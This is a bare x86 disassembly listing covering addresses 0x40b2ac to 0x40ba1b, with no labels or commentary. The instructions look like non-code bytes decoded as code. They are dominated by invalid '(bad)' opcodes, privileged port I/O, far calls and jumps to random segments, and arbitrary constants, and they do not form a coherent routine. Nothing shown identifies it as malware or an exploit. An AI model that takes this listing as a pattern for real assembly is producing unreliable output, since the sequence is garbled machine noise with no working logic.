  40b2ac:	mov    eax,ds:0x5fc803c2
  40b2b1:	mov    bh,0x1e
  40b2b3:	idiv   edx
  40b2b5:	inc    esi
  40b2b6:	sbb    BYTE PTR [edi+0x257a3f5e],dl
  40b2bc:	or     ah,al
  40b2be:	sub    DWORD PTR [ebx+0x1afdba80],esp
  40b2c4:	lods   al,BYTE PTR ds:[esi]
  40b2c5:	mov    ds:0x86ec57,eax
  40b2ca:	test   al,0x47
  40b2cc:	cmp    BYTE PTR [ecx],bl
  40b2ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2cf:	mov    ds:0x2d89316d,eax
  40b2d4:	leave  
  40b2d5:	loop   0x40b2b9
  40b2d7:	loopne 0x40b25b
  40b2d9:	pop    ebp
  40b2da:	out    dx,eax
  40b2db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2dc:	addr16 fwait
  40b2de:	push   esi
  40b2df:	push   0xa3198d6f
  40b2e4:	sbb    al,0xf1
  40b2e6:	mov    ebx,0x7a9d45c4
  40b2eb:	rol    BYTE PTR [eax],0xf4
  40b2ee:	inc    ebx
  40b2ef:	xor    DWORD PTR [edi],0x6ce8e83
  40b2f5:	xchg   DWORD PTR gs:[esi+0x47],esi
  40b2f9:	mov    cl,0x36
  40b2fb:	movd   ebx,mm4
  40b2fe:	test   DWORD PTR [ebx],edi
  40b300:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b301:	sub    ebx,DWORD PTR [ebx+0x5a]
  40b304:	cli    
  40b305:	in     al,0x41
  40b307:	jle    0x40b347
  40b309:	jns    0x40b304
  40b30b:	sbb    al,0x80
  40b30d:	sbb    edx,DWORD PTR [edi-0x7dafd6c2]
  40b313:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b314:	test   eax,0xf930acd6
  40b319:	leave  
  40b31a:	jae    0x40b2e2
  40b31c:	aad    0x95
  40b31e:	fnstenv [eax]
  40b320:	repnz mov cl,0x16
  40b323:	sub    DWORD PTR [esi+0x54],esi
  40b326:	das    
  40b327:	nop
  40b328:	adc    eax,0xdea7292c
  40b32d:	inc    edx
  40b32e:	pushf  
  40b32f:	icebp  
  40b330:	xchg   DWORD PTR [ebx-0xa],ecx
  40b333:	mov    ebp,0xd5b95742
  40b338:	xlat   BYTE PTR ds:[ebx]
  40b339:	popf   
  40b33a:	sub    edi,DWORD PTR [edx]
  40b33c:	and    dl,BYTE PTR [ebx+0x2]
  40b33f:	pop    ebp
  40b340:	es sbb al,0xff
  40b343:	mov    esp,0x138db6c5
  40b348:	(bad)  
  40b34a:	push   0x9174d1de
  40b34f:	mov    esp,DWORD PTR [ebp+ebx*8-0x2c268944]
  40b356:	out    dx,eax
  40b357:	adc    DWORD PTR [ebp+0x31],ebp
  40b35a:	dec    edx
  40b35b:	pop    ecx
  40b35c:	dec    edi
  40b35d:	push   edi
  40b35e:	sbb    esp,ebp
  40b360:	xor    DWORD PTR [ebx],esi
  40b362:	sbb    ah,BYTE PTR [edi+eiz*4+0x12]
  40b366:	cmp    cl,BYTE PTR [ebp+0x584d6361]
  40b36c:	mov    ebp,0x5d6052f6
  40b371:	xor    ebx,esp
  40b373:	call   0x4406:0x7e1d4423
  40b37a:	add    cl,BYTE PTR [eax+0x4bf3f784]
  40b380:	cwde   
  40b381:	in     eax,0x3c
  40b383:	mov    ebp,0x7e5cd8f2
  40b388:	fist   DWORD PTR [ebx-0x2e]
  40b38b:	push   0xf9b568ea
  40b390:	(bad)  
  40b391:	sbb    ch,BYTE PTR [edi+0x7d]
  40b394:	jne    0x40b368
  40b396:	cmp    dh,BYTE PTR [edx+0x72df3e4c]
  40b39c:	mov    dl,0xbd
  40b39e:	inc    DWORD PTR [esi]
  40b3a0:	ror    DWORD PTR [esi],cl
  40b3a2:	sub    DWORD PTR [eax-0x62],eax
  40b3a5:	jnp    0x40b3c6
  40b3a7:	mov    DWORD PTR [ecx-0x5dbf7384],ebp
  40b3ad:	fst    QWORD PTR [ecx]
  40b3af:	cmp    BYTE PTR [edx],bh
  40b3b1:	jnp    0x40b340
  40b3b3:	ret    
  40b3b4:	pop    edx
  40b3b5:	jp     0x40b3b3
  40b3b7:	sub    esi,DWORD PTR [ebp-0x31afaf66]
  40b3bd:	mov    al,0x28
  40b3bf:	cmp    al,0x83
  40b3c1:	and    eax,ebp
  40b3c3:	push   ds
  40b3c4:	icebp  
  40b3c5:	sbb    dh,BYTE PTR [esi]
  40b3c7:	jne    0x40b396
  40b3c9:	xor    BYTE PTR [ecx],bl
  40b3cb:	ds inc ecx
  40b3cd:	push   es
  40b3ce:	scas   eax,DWORD PTR es:[edi]
  40b3cf:	gs pushf 
  40b3d1:	imul   ecx,ebp,0x9e88afe5
  40b3d7:	mov    dh,0x46
  40b3d9:	sahf   
  40b3da:	jle    0x40b427
  40b3dc:	inc    ebx
  40b3dd:	xor    ch,bh
  40b3df:	mov    ecx,0x97875189
  40b3e4:	or     DWORD PTR [ecx+esi*4],edi
  40b3e7:	(bad)  
  40b3e9:	add    BYTE PTR [ecx+eax*2],bl
  40b3ec:	push   ecx
  40b3ed:	sbb    DWORD PTR [edi+0x1c1e78f7],ebx
  40b3f3:	aad    0xd2
  40b3f5:	leave  
  40b3f6:	xchg   edx,eax
  40b3f7:	(bad)  
  40b3f8:	ss adc eax,0x66f207ad
  40b3fe:	sub    esi,DWORD PTR [edi]
  40b400:	mov    edx,0xa836d7c4
  40b405:	hlt    
  40b406:	push   ss
  40b407:	(bad)  
  40b408:	cmp    ebp,DWORD PTR es:[edi+ecx*1]
  40b40c:	shr    BYTE PTR [ebp+0x12],0x30
  40b410:	inc    ecx
  40b411:	mov    DWORD PTR [ebx-0x61c95af0],edi
  40b417:	hlt    
  40b418:	cmp    ebp,DWORD PTR [eax+esi*4-0x313b96fb]
  40b41f:	push   ecx
  40b420:	pop    esp
  40b421:	pusha  
  40b422:	repz push cs
  40b424:	(bad)  [eax+0x3f27e45a]
  40b42a:	ja     0x40b46a
  40b42c:	mov    edi,0x57ca5dde
  40b431:	ror    DWORD PTR [ecx+ebp*1-0x35],cl
  40b435:	mov    WORD PTR [ebx-0x48],cs
  40b438:	into   
  40b439:	ds xchg edx,eax
  40b43b:	stos   DWORD PTR es:[edi],eax
  40b43c:	jge    0x916d3067
  40b442:	mov    DWORD PTR [edi+0x6c],ecx
  40b445:	mov    ds:0xd5d84653,eax
  40b44a:	mov    al,ds:0xa6ef0123
  40b44f:	aas    
  40b450:	inc    ecx
  40b451:	outs   dx,BYTE PTR ds:[esi]
  40b452:	xlat   BYTE PTR ds:[ebx]
  40b453:	adc    cl,dh
  40b455:	repz out dx,eax
  40b457:	or     eax,0xab83519a
  40b45c:	iret   
  40b45d:	dec    ebx
  40b45e:	cmp    bh,BYTE PTR [esi]
  40b460:	dec    edi
  40b461:	in     al,0x9e
  40b463:	(bad)  
  40b464:	push   esp
  40b465:	out    0x73,al
  40b467:	ret    0x1d4d
  40b46a:	jb     0x40b4b7
  40b46c:	lods   al,BYTE PTR ds:[esi]
  40b46d:	enter  0xac3f,0x12
  40b471:	inc    eax
  40b472:	mov    al,0x3e
  40b474:	push   0x16816f58
  40b479:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b47a:	xlat   BYTE PTR ds:[ebx]
  40b47b:	pop    es
  40b47c:	popf   
  40b47d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b47e:	inc    edi
  40b47f:	outs   dx,DWORD PTR ds:[esi]
  40b480:	mov    ecx,0x3b4d3d19
  40b485:	orps   xmm1,XMMWORD PTR [edi+0x4ac0e19a]
  40b48c:	or     dl,bl
  40b48e:	mov    cl,0xf8
  40b490:	test   DWORD PTR [edx-0x2d],eax
  40b493:	and    DWORD PTR [eax+0x63d8a8c6],eax
  40b499:	cmp    BYTE PTR [ecx+0x5c0113a],0x41
  40b4a0:	stc    
  40b4a1:	in     al,0x4b
  40b4a3:	bound  ecx,QWORD PTR [eax+ebx*4-0x1d86edb2]
  40b4aa:	xchg   esi,esi
  40b4ac:	std    
  40b4ad:	ins    DWORD PTR es:[edi],dx
  40b4ae:	xchg   BYTE PTR [esi],ah
  40b4b0:	pop    ebp
  40b4b1:	push   edx
  40b4b2:	jmp    0x82fadf4a
  40b4b7:	jle    0x40b4b5
  40b4b9:	add    ch,BYTE PTR [esi-0x234dc9b6]
  40b4bf:	sbb    bl,0xc6
  40b4c2:	fld    st(2)
  40b4c4:	mov    esp,0x1bb6b7cc
  40b4c9:	sub    al,0xd0
  40b4cb:	cmp    al,0x5e
  40b4cd:	jns    0x40b49f
  40b4cf:	lock mov ch,0xb9
  40b4d2:	std    
  40b4d3:	mov    ch,0x83
  40b4d5:	and    eax,0x137e5f2a
  40b4da:	and    DWORD PTR ds:0x8f1700ee,edx
  40b4e0:	cwde   
  40b4e1:	dec    esi
  40b4e2:	push   edi
  40b4e3:	out    0xc6,al
  40b4e5:	je     0x40b475
  40b4e7:	jne    0x4a99caf0
  40b4ed:	dec    esi
  40b4ee:	sahf   
  40b4ef:	mov    esp,0x7556fd81
  40b4f4:	sbb    ah,BYTE PTR [eax]
  40b4f6:	xor    al,0xb5
  40b4f8:	mov    bl,0xb0
  40b4fa:	sbb    DWORD PTR [ecx],eax
  40b4fc:	dec    edi
  40b4fd:	hlt    
  40b4fe:	lock xor ecx,ebx
  40b501:	ret    0x2a66
  40b504:	(bad)  
  40b505:	jmp    0xfe74:0x979e5b47
  40b50c:	stc    
  40b50d:	icebp  
  40b50e:	rol    DWORD PTR [ebx],cl
  40b510:	sbb    eax,0xbfd7de47
  40b515:	jns    0x40b508
  40b517:	lds    edi,FWORD PTR [edi]
  40b519:	outs   dx,BYTE PTR ds:[esi]
  40b51a:	les    eax,FWORD PTR [ecx+ecx*4]
  40b51d:	imul   edi,esp,0x48cad7c7
  40b523:	push   ecx
  40b524:	scas   eax,DWORD PTR es:[edi]
  40b525:	mov    ebx,0xa0083af5
  40b52a:	ins    DWORD PTR es:[edi],dx
  40b52b:	pop    ds
  40b52c:	jmp    0xe47:0x99683966
  40b533:	sbb    eax,ecx
  40b535:	iret   
  40b536:	or     ebx,DWORD PTR [ebp-0x206e06ef]
  40b53c:	xchg   ecx,eax
  40b53d:	in     al,0x6e
  40b53f:	sti    
  40b540:	cmp    al,0xcd
  40b542:	fwait
  40b543:	dec    esp
  40b544:	shl    DWORD PTR [ebp-0x446fe895],1
  40b54a:	mov    ecx,ss
  40b54c:	sub    ecx,DWORD PTR [ebp-0xae25cb7]
  40b552:	cwde   
  40b553:	(bad)  
  40b554:	inc    DWORD PTR [edx-0x4261da0a]
  40b55a:	fst    st(2)
  40b55c:	dec    edi
  40b55d:	fwait
  40b55e:	lods   eax,DWORD PTR ds:[esi]
  40b55f:	(bad)  
  40b560:	mov    ebx,0xd7885644
  40b565:	addr16 jno 0x40b53e
  40b568:	mov    dl,0xb2
  40b56a:	cdq    
  40b56b:	ins    BYTE PTR es:[edi],dx
  40b56c:	mov    dl,0x1d
  40b56e:	ins    DWORD PTR es:[edi],dx
  40b56f:	mov    ecx,0xc3b83ee0
  40b574:	es inc esp
  40b576:	cmp    BYTE PTR [edx+edx*8-0x27],0x2b
  40b57b:	xchg   ebx,eax
  40b57c:	xlat   BYTE PTR ds:[ebx]
  40b57d:	and    eax,DWORD PTR [eax-0x1c]
  40b580:	jge    0x40b5a6
  40b582:	gs int 0x60
  40b585:	pusha  
  40b586:	jnp    0x40b528
  40b588:	sub    dh,al
  40b58a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b58b:	in     eax,0x11
  40b58d:	mov    dh,0x73
  40b58f:	imul   esp,ecx,0xffffff8d
  40b592:	into   
  40b593:	pushf  
  40b594:	jle    0x40b5c8
  40b596:	and    DWORD PTR [eax+0x6d],0x828f37e9
  40b59d:	clc    
  40b59e:	dec    esi
  40b59f:	push   es
  40b5a0:	mov    ecx,DWORD PTR [ecx+edx*4]
  40b5a3:	popa   
  40b5a4:	fwait
  40b5a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5a6:	add    edx,edx
  40b5a8:	arpl   WORD PTR [eax+0x2b14f2e6],dx
  40b5ae:	or     eax,0x451e93c3
  40b5b3:	mov    al,0xcd
  40b5b5:	cwde   
  40b5b6:	jb     0x40b5b0
  40b5b8:	sub    DWORD PTR [edi+0x1d0c25a],esi
  40b5be:	(bad)  
  40b5bf:	sbb    eax,ebp
  40b5c1:	sbb    al,0xbf
  40b5c3:	fcmove st,st(1)
  40b5c5:	or     al,0xf4
  40b5c7:	xchg   ecx,eax
  40b5c8:	push   esp
  40b5c9:	pushf  
  40b5ca:	mov    esp,0xbea41223
  40b5cf:	jecxz  0x40b5c3
  40b5d1:	(bad)  
  40b5d2:	xlat   BYTE PTR ds:[ebx]
  40b5d3:	cmp    bh,BYTE PTR [edi+0x7756b6ab]
  40b5d9:	inc    edx
  40b5da:	shl    DWORD PTR [ebx],cl
  40b5dc:	aam    0xf6
  40b5de:	pop    esp
  40b5df:	mov    bh,0xa6
  40b5e1:	mov    edx,edi
  40b5e3:	mov    ah,0x3a
  40b5e5:	jno    0x40b5ab
  40b5e7:	sub    edx,DWORD PTR [eax]
  40b5e9:	loop   0x40b62b
  40b5eb:	dec    ebx
  40b5ec:	call   0xd46e:0x356de0f0
  40b5f3:	(bad)  
  40b5f4:	dec    ebp
  40b5f5:	jmp    0xcc96:0xa42d136a
  40b5fc:	sbb    eax,0xce616e57
  40b601:	rcr    BYTE PTR [edx+0x47],0x3e
  40b605:	dec    esi
  40b606:	adc    al,0xea
  40b608:	jb     0x40b608
  40b60a:	(bad)  
  40b60b:	mov    esi,0x35492857
  40b610:	mov    cl,BYTE PTR [edi+esi*2]
  40b613:	mov    eax,0xe9c93eb
  40b618:	jae    0x40b5f5
  40b61a:	(bad)  
  40b61b:	imul   BYTE PTR [ebx]
  40b61d:	push   ds
  40b61e:	call   0x51ae:0x52062a72
  40b625:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b626:	in     al,dx
  40b627:	mov    ds:0x29ac693f,al
  40b62c:	out    0x6c,al
  40b62e:	dec    edi
  40b62f:	xchg   edx,ebx
  40b631:	mov    ds:0x4eb34491,eax
  40b636:	daa    
  40b637:	and    ebp,DWORD PTR [ecx]
  40b639:	sbb    al,0xfd
  40b63b:	inc    edx
  40b63c:	call   0xdbbf:0x11226002
  40b643:	adc    al,dh
  40b645:	stc    
  40b646:	jg     0x40b645
  40b648:	cwde   
  40b649:	js     0x40b69c
  40b64b:	inc    edx
  40b64c:	push   cs
  40b64d:	and    DWORD PTR ds:0x852f49bc,edi
  40b653:	retf   
  40b654:	in     eax,0x8b
  40b656:	fld    DWORD PTR [esi+0x54]
  40b659:	aas    
  40b65a:	inc    esp
  40b65b:	pop    ds
  40b65c:	pop    edx
  40b65d:	test   eax,0x1ba1d45e
  40b662:	lahf   
  40b663:	xchg   DWORD PTR [edx],ebp
  40b665:	dec    ebp
  40b666:	into   
  40b667:	popa   
  40b668:	adc    DWORD PTR [ecx+0x30],esi
  40b66b:	fldcw  WORD PTR [edx+0x23c50a92]
  40b671:	(bad)  
  40b672:	xor    eax,0x207070a7
  40b677:	int    0x3d
  40b679:	add    dl,dl
  40b67b:	mov    edx,0xab3e9094
  40b680:	lds    edi,FWORD PTR [edi-0x7c34a05e]
  40b686:	ss mov cl,0xb6
  40b689:	icebp  
  40b68a:	xchg   esi,eax
  40b68b:	adc    eax,0x2248531a
  40b690:	mov    ds:0x278119eb,al
  40b695:	xor    eax,0xcb4f865c
  40b69a:	leave  
  40b69b:	call   0x887f:0x7b772013
  40b6a2:	test   dl,dl
  40b6a4:	call   0x91e08d64
  40b6a9:	rol    BYTE PTR [ecx-0x5f],1
  40b6ac:	call   0x73a4:0x54a1db68
  40b6b3:	push   esi
  40b6b4:	lods   eax,DWORD PTR ds:[esi]
  40b6b5:	jge    0x40b699
  40b6b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6b8:	rol    DWORD PTR [ebp-0x5f167bdd],cl
  40b6be:	loope  0x40b700
  40b6c0:	pop    es
  40b6c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6c2:	lahf   
  40b6c3:	or     esp,DWORD PTR ds:0x734570f5
  40b6c9:	ja     0x40b6ee
  40b6cb:	outs   dx,DWORD PTR ds:[esi]
  40b6cc:	push   ebx
  40b6cd:	add    dh,BYTE PTR [ecx-0x420ad72a]
  40b6d3:	pop    edi
  40b6d4:	dec    esi
  40b6d5:	sub    edi,DWORD PTR [ebx]
  40b6d7:	mov    cl,0xb7
  40b6d9:	sub    edx,DWORD PTR [esi]
  40b6db:	push   eax
  40b6dc:	mov    esi,0x263a884d
  40b6e1:	leave  
  40b6e2:	mov    al,0xeb
  40b6e4:	popa   
  40b6e5:	add    eax,0xe44f638e
  40b6ea:	mov    WORD PTR [edx-0x5],?
  40b6ed:	ins    DWORD PTR es:[edi],dx
  40b6ee:	adc    esp,edi
  40b6f0:	push   ds
  40b6f1:	adc    DWORD PTR ds:0x7418fcb4,edi
  40b6f7:	cmp    edi,DWORD PTR [ebp+0x31]
  40b6fa:	lock dec edi
  40b6fc:	ror    al,cl
  40b6fe:	add    DWORD PTR [eax+0x67a89bf6],eax
  40b704:	xchg   ecx,eax
  40b705:	sti    
  40b706:	cwde   
  40b707:	dec    esp
  40b708:	inc    esp
  40b709:	mov    dh,0xe1
  40b70b:	xchg   ebp,eax
  40b70c:	js     0x40b728
  40b70e:	mov    gs,WORD PTR [ebp-0x6575e44]
  40b714:	xchg   ebx,eax
  40b715:	jl     0x40b750
  40b717:	push   eax
  40b718:	sub    ch,dh
  40b71a:	and    al,0x4
  40b71c:	pop    edx
  40b71d:	add    al,0xec
  40b71f:	xchg   ebp,eax
  40b720:	push   cs
  40b721:	stc    
  40b722:	mov    dl,0x10
  40b724:	and    eax,0xd91a7051
  40b729:	ds cmp al,0x49
  40b72c:	(bad)  
  40b72d:	sbb    al,0xff
  40b72f:	dec    eax
  40b730:	jae    0x40b7a4
  40b732:	inc    esi
  40b733:	dec    ebx
  40b734:	or     al,0x4
  40b736:	test   al,0x42
  40b738:	add    eax,0xf591837
  40b73d:	leave  
  40b73e:	push   ds
  40b73f:	in     eax,0x49
  40b741:	or     ch,BYTE PTR [ecx+0xd]
  40b744:	(bad)  
  40b746:	pop    eax
  40b747:	(bad)  
  40b749:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b74a:	pop    edi
  40b74b:	cld    
  40b74c:	cvtps2pd xmm4,xmm0
  40b74f:	cwde   
  40b750:	jg     0x40b75a
  40b752:	fsubr  DWORD PTR [eax+0x52d4a4b]
  40b758:	adc    eax,0x79f7c83f
  40b75d:	outs   dx,BYTE PTR ds:[esi]
  40b75e:	out    0xa5,eax
  40b760:	stc    
  40b761:	add    DWORD PTR [eax],eax
  40b763:	je     0x40b6f9
  40b765:	retf   
  40b766:	push   edx
  40b767:	mov    ecx,?
  40b769:	and    BYTE PTR [esi],0x6c
  40b76c:	jbe    0x40b789
  40b76e:	push   edi
  40b76f:	mov    bh,BYTE PTR [ebx+0x732cc3ab]
  40b775:	loop   0x40b760
  40b777:	jo     0x40b72c
  40b779:	lahf   
  40b77a:	push   es
  40b77b:	mov    ebp,0xa748fd45
  40b780:	pop    ecx
  40b781:	loope  0x40b7d2
  40b783:	imul   ecx,DWORD PTR [edx-0x7b08a1e0],0xffffff83
  40b78a:	jne    0x40b7fc
  40b78c:	xchg   ecx,eax
  40b78d:	adc    DWORD PTR [edi+0x1e],ebx
  40b790:	jno    0x40b7e0
  40b792:	loop   0x40b7a5
  40b794:	shr    BYTE PTR [edi+0x6f],cl
  40b797:	scas   al,BYTE PTR es:[edi]
  40b798:	mov    eax,0xb89e9ad6
  40b79d:	sub    eax,DWORD PTR [edx-0x3f]
  40b7a0:	pop    ecx
  40b7a1:	int    0x2b
  40b7a3:	pop    edi
  40b7a4:	dec    eax
  40b7a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7a6:	mov    eax,0x4a17a8f4
  40b7ab:	into   
  40b7ac:	and    ebx,DWORD PTR [eax]
  40b7ae:	push   ecx
  40b7af:	call   0x4ed1:0x44ee25dc
  40b7b6:	mov    ebx,0x65d82c1
  40b7bb:	icebp  
  40b7bc:	retf   0x75c9
  40b7bf:	fcomip st,st(4)
  40b7c1:	test   al,0x11
  40b7c3:	jl     0x40b74a
  40b7c5:	push   cs
  40b7c6:	jo     0x40b79b
  40b7c8:	inc    ebp
  40b7c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7ca:	push   ebp
  40b7cb:	cmp    edi,DWORD PTR [edi+ecx*1+0x2d]
  40b7cf:	aam    0x82
  40b7d1:	pop    edi
  40b7d2:	dec    edi
  40b7d3:	jbe    0x40b7b5
  40b7d5:	fsubr  DWORD PTR [ebx]
  40b7d7:	lock jbe 0x40b794
  40b7da:	and    eax,0x8e9b1105
  40b7df:	data16 or BYTE PTR [edx+edi*1+0x2bb72eca],bl
  40b7e7:	dec    ebp
  40b7e8:	xchg   ecx,eax
  40b7e9:	push   esp
  40b7ea:	xor    al,0x68
  40b7ec:	pop    es
  40b7ed:	cmp    ah,BYTE PTR [esi-0x2a9f42e3]
  40b7f3:	push   ebx
  40b7f4:	pop    esi
  40b7f5:	and    DWORD PTR [ecx],ecx
  40b7f7:	pop    eax
  40b7f8:	mov    DWORD PTR [ecx+0x666a3664],edi
  40b7fe:	lds    edx,FWORD PTR [edi+0x23]
  40b801:	mov    dl,0x2b
  40b803:	cmp    BYTE PTR [edx+ebx*4+0x59350a68],0x40
  40b80b:	sub    bl,ch
  40b80d:	xlat   BYTE PTR ds:[ebx]
  40b80e:	xor    edx,DWORD PTR [ecx-0x2f]
  40b811:	sub    DWORD PTR [esi-0x55],ebx
  40b814:	sti    
  40b815:	and    al,0x98
  40b817:	inc    edi
  40b818:	sbb    cl,bl
  40b81a:	imul   edi,DWORD PTR ds:0x364bd379,0xffffffdc
  40b821:	add    eax,0x54b69760
  40b826:	in     eax,dx
  40b827:	icebp  
  40b828:	add    eax,0xac22ef59
  40b82d:	jbe    0x40b806
  40b82f:	cwde   
  40b830:	pushf  
  40b831:	gs daa 
  40b833:	in     al,0x35
  40b835:	xlat   BYTE PTR ds:[ebx]
  40b836:	pop    edx
  40b837:	mov    edx,0x487bb1de
  40b83c:	into   
  40b83d:	pop    ds
  40b83e:	ja     0x40b7da
  40b840:	out    0x9d,al
  40b842:	lea    edi,[esi]
  40b844:	xor    DWORD PTR [edi-0x71],ebx
  40b847:	dec    ebx
  40b848:	ficom  DWORD PTR [ebx+ecx*4+0x1a]
  40b84c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b84d:	js     0x40b85d
  40b84f:	test   BYTE PTR [ebx],dh
  40b851:	push   ss
  40b852:	jmp    0xddc4:0x4c622374
  40b859:	xchg   dh,bh
  40b85b:	pop    ebx
  40b85c:	jp     0x40b8d7
  40b85e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b85f:	pop    ds
  40b860:	leave  
  40b861:	inc    edi
  40b862:	lods   eax,DWORD PTR ds:[esi]
  40b863:	ficomp DWORD PTR [ecx]
  40b865:	aaa    
  40b866:	sub    BYTE PTR [edx],bl
  40b868:	inc    ecx
  40b869:	inc    eax
  40b86a:	leave  
  40b86b:	pop    edi
  40b86c:	stos   DWORD PTR es:[edi],eax
  40b86d:	repnz mov ds:0xde5b7dd8,eax
  40b873:	cli    
  40b874:	push   ss
  40b875:	aad    0x94
  40b877:	sbb    al,0xbd
  40b879:	sub    DWORD PTR [eax+0x52],edi
  40b87c:	fisttp DWORD PTR [ebp-0x61]
  40b87f:	jecxz  0x40b80b
  40b881:	vxorpd ymm0,ymm4,YMMWORD PTR [eax+eax*2+0xe]
  40b887:	shl    BYTE PTR [eax+0x7c79a320],cl
  40b88d:	cdq    
  40b88e:	out    dx,al
  40b88f:	dec    edx
  40b890:	xor    DWORD PTR [edx+0x33],ebx
  40b893:	and    ecx,0xdd612a6f
  40b899:	iret   
  40b89a:	dec    edi
  40b89b:	mov    bl,0x56
  40b89d:	int3   
  40b89e:	sbb    ah,bh
  40b8a0:	pop    es
  40b8a1:	js     0x40b826
  40b8a3:	sub    dh,BYTE PTR [edi+0x54e76b9]
  40b8a9:	mov    ss,WORD PTR [ecx]
  40b8ab:	pop    ds
  40b8ac:	and    DWORD PTR [edi+0x3e],0xaed0ca4a
  40b8b3:	sub    DWORD PTR [esi-0x3f],eax
  40b8b6:	(bad)  
  40b8b7:	push   esp
  40b8b8:	and    DWORD PTR [eax+0x2d42f60d],edi
  40b8be:	js     0x40b869
  40b8c0:	and    esp,esp
  40b8c2:	ins    DWORD PTR es:[edi],dx
  40b8c3:	adc    DWORD PTR [edi-0x2c1606fd],ecx
  40b8c9:	scas   al,BYTE PTR es:[edi]
  40b8ca:	sahf   
  40b8cb:	push   ecx
  40b8cc:	arpl   WORD PTR [ebx-0x44793090],dx
  40b8d2:	xchg   edx,eax
  40b8d3:	lods   al,BYTE PTR ds:[esi]
  40b8d4:	in     al,0xfa
  40b8d6:	neg    DWORD PTR [ecx+0x70b3787e]
  40b8dc:	adc    eax,0x45d1be13
  40b8e1:	cwde   
  40b8e2:	dec    esi
  40b8e3:	test   BYTE PTR [edi],ch
  40b8e5:	pop    ss
  40b8e6:	xchg   ebp,eax
  40b8e7:	xchg   ebx,eax
  40b8e8:	in     al,0x95
  40b8ea:	cwde   
  40b8eb:	cmp    al,0x94
  40b8ed:	xor    cl,bh
  40b8ef:	int3   
  40b8f0:	int3   
  40b8f1:	push   DWORD PTR [ecx+0x50b56451]
  40b8f7:	and    DWORD PTR [ebx],0xffffffc0
  40b8fa:	jnp    0x40b96a
  40b8fc:	inc    edx
  40b8fd:	call   0xe71f:0xcb7ad11
  40b904:	or     BYTE PTR [eax+0x1845fe0c],ah
  40b90a:	call   0xfcfadc3d
  40b90f:	icebp  
  40b910:	push   ds
  40b911:	test   DWORD PTR [ecx],0xc9fc20af
  40b917:	push   ecx
  40b918:	pushf  
  40b919:	cmp    esp,ecx
  40b91b:	mov    cl,dl
  40b91d:	out    0x89,al
  40b91f:	rcr    DWORD PTR [edi+0x194b79e],cl
  40b925:	push   ebx
  40b926:	ror    BYTE PTR [ebx],1
  40b928:	ret    0x474e
  40b92b:	sub    cl,ah
  40b92d:	test   eax,0x2a1b752a
  40b932:	add    DWORD PTR [edx+0x5],edi
  40b935:	dec    ebp
  40b936:	adc    al,0x42
  40b938:	adc    edx,esp
  40b93a:	and    bh,0x4a
  40b93d:	push   0xc4368bd0
  40b942:	jmp    0x40b931
  40b944:	mov    cl,0xa5
  40b946:	cmp    DWORD PTR [ecx],esi
  40b948:	xchg   edi,eax
  40b949:	mov    ch,0x19
  40b94b:	rol    BYTE PTR [bp-0xe],cl
  40b94f:	call   0x5d4a:0xe96468fe
  40b956:	or     BYTE PTR [esp+ebx*4+0x37ae030],dh
  40b95d:	sub    al,0x19
  40b95f:	imul   eax,DWORD PTR [eax+0x58eb5992],0x22e3f039
  40b969:	cmp    al,0xb5
  40b96b:	test   ch,al
  40b96d:	or     DWORD PTR [edi+0x54],esi
  40b970:	push   0x6bf441be
  40b975:	sti    
  40b976:	mov    esi,0x3dc0f4d5
  40b97b:	inc    esp
  40b97c:	mov    ah,0x17
  40b97e:	shl    DWORD PTR [edx+0x24],cl
  40b981:	pop    esp
  40b982:	xor    edx,DWORD PTR [edi+0x7c]
  40b985:	out    0x30,eax
  40b987:	shl    al,1
  40b989:	imul   ebx,DWORD PTR [eax+ebp*1-0x1c],0xac377ada
  40b991:	mov    ds:0x7803895c,al
  40b996:	rol    DWORD PTR [ebx],0x9d
  40b999:	imul   ebx,eax,0xb8d64cd4
  40b99f:	mov    ecx,0x87940045
  40b9a4:	mov    al,ds:0xcd466768
  40b9a9:	call   0x3110:0x3fadf3a7
  40b9b0:	push   edi
  40b9b1:	ds mov bp,0x5ed6
  40b9b6:	push   ss
  40b9b7:	cmc    
  40b9b8:	jmp    0x7d79:0x52509859
  40b9bf:	adc    eax,0x9eb0b7cf
  40b9c4:	xor    DWORD PTR [ecx-0x65af36e3],0xcd50a5a
  40b9ce:	ins    BYTE PTR es:[edi],dx
  40b9cf:	sub    BYTE PTR [esi],al
  40b9d1:	addr16 in eax,dx
  40b9d3:	in     eax,0xec
  40b9d5:	jne    0x40b967
  40b9d7:	cli    
  40b9d8:	mov    ebp,edi
  40b9da:	dec    esi
  40b9db:	mov    al,ds:0xe2567330
  40b9e0:	scas   al,BYTE PTR es:[edi]
  40b9e1:	fdivr  DWORD PTR [edi-0x4a8a84e1]
  40b9e7:	adc    eax,0x29d9bb7
  40b9ec:	sbb    al,0x9c
  40b9ee:	das    
  40b9ef:	gs icebp 
  40b9f1:	push   cs
  40b9f2:	int3   
  40b9f3:	std    
  40b9f4:	addr16 or eax,0x7bd651c4
  40b9fa:	xor    ecx,0xe4981c34
  40ba00:	push   ebp
  40ba01:	or     al,0xaa
  40ba03:	jns    0x40ba30
  40ba05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba06:	mov    ch,0x1f
  40ba08:	inc    ebx
  40ba09:	shr    dh,1
  40ba0b:	loop   0x40ba41
  40ba0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba0e:	mov    esp,es
  40ba10:	and    al,0x28
  40ba12:	lock jb 0x40ba63
  40ba15:	gs mov cl,0x13
  40ba18:	mov    ah,0x9d
  40ba1a:	pop    ebp
  40ba1b:	fiadd  DWORD PTR [edi]
